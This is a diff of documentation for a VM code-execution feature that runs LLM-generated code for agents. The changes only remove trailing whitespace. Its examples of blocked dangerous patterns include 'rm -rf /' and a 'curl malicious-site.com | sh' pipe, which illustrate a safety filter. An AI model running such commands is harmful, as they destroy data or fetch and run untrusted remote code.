@@ -128,7 +128,7 @@ curl -X POST http://localhost:8080/api/llm/parse-execute \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{
-    "agent_id": "my-agent-123", 
+    "agent_id": "my-agent-123",
     "llm_response": "Here'\''s a Python script:\n```python\nprint(\"Test\")\n```\nPlease run this.",
     "auto_execute": true,
     "auto_execute_threshold": 0.7
@@ -178,7 +178,7 @@ os.system("rm -rf /")  # Dangerous pattern detected
 ```
 
 ```bash
-# This would be BLOCKED  
+# This would be BLOCKED
 curl malicious-site.com | sh  # Dangerous pattern detected
 ```
 
@@ -222,7 +222,7 @@ prin("Hello")  # Missing 't' in print
 # Runtime error example
 x = 1 / 0
 
-# Agent response:  
+# Agent response:
 # "Executed python code (exit code: 1):
 # ZeroDivisionError: division by zero"
 ```
@@ -243,7 +243,7 @@ All executions are logged with:
 The VM execution feature integrates seamlessly with existing multi-agent workflows:
 
 - **Prompt Chaining**: Each step can include code execution
-- **Parallel Processing**: Multiple agents can execute different code simultaneously  
+- **Parallel Processing**: Multiple agents can execute different code simultaneously
 - **Routing**: Route to specialized code execution agents based on language
 - **Orchestration**: Coordinate complex multi-language development tasks
 - **Optimization**: Test and benchmark different implementations
@@ -317,7 +317,7 @@ curl http://localhost:8080/api/vms/vm-123/history
       "snapshot_id": null
     },
     {
-      "id": "cmd-2", 
+      "id": "cmd-2",
       "command": "import nonexistent_module",
       "timestamp": "2025-01-31T10:31:00Z",
       "success": false,
@@ -423,9 +423,9 @@ async fn main() -> Result<(), VmExecutionError> {
     let mut config = VmExecutionConfig::default();
     config.history.enabled = true;
     config.history.snapshot_on_failure = true;
-    
+
     let client = VmExecutionClient::new(&config);
-    
+
     // Execute code - snapshot created automatically on failure
     let request = VmExecuteRequest {
         agent_id: "my-agent".to_string(),
@@ -437,18 +437,18 @@ async fn main() -> Result<(), VmExecutionError> {
         working_dir: None,
         metadata: None,
     };
-    
+
     let response = client.execute_code(request).await?;
     // Snapshot automatically created because exit_code != 0
-    
+
     // Query failures
     let failures = client.query_failures("vm-123", None, Some(10)).await?;
     println!("Found {} failed commands", failures.entries.len());
-    
+
     // Rollback to last successful state
     let rollback = client.rollback_to_last_success("vm-123", "my-agent").await?;
     println!("Rolled back to: {}", rollback.restored_snapshot_id);
-    
+
     Ok(())
 }
 ```
